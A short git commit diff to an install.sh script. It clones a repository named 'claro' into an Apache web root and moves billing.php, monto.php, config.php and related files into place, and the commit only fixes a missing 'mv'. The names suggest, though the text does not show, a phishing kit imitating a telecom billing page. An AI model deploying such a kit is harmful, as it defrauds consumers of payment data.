f45fca3a0bdea50767f47a8bec8d1c845fc83b9e
RESEKK VPS <103382307+resekk-vps@users.noreply.github.com>
2022-04-11 08:31:52 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,5 +2,5 @@
 cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/claro
 cd /var/www/claro; nano config.php
-cd /var/www/direct; mv ccs /var/www; mv data /var/www; estilos /var/www; mv imagenes /var/www; mv billing.php /var/www; mv config.php /var/www; mv error.php /var/www; mv index.html /var/www; mv monto.php /var/www
+cd /var/www/direct; mv ccs /var/www; mv data /var/www; mv estilos /var/www; mv imagenes /var/www; mv billing.php /var/www; mv config.php /var/www; mv error.php /var/www; mv index.html /var/www; mv monto.php /var/www
 sudo service apache2 restart
